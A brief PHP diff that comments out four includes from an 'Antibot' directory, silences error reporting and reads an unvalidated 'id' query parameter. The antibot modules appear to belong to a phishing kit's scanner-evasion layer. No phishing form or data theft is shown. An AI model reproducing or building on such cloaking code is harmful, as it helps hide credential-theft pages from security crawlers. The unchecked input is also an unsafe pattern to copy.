@@ -2,10 +2,10 @@
 
 error_reporting(0);
 
-include('..Antibot/Bot-Crawler.php');
-include('..Antibot/Dila_DZ.php');
-include('..Antibot/blockers.php');
-include('..Antibot/detects.php');
+// include('..Antibot/Bot-Crawler.php');
+// include('..Antibot/Dila_DZ.php');
+// include('..Antibot/blockers.php');
+// include('..Antibot/detects.php');
 
 session_start();
 $id = $_GET['id'];
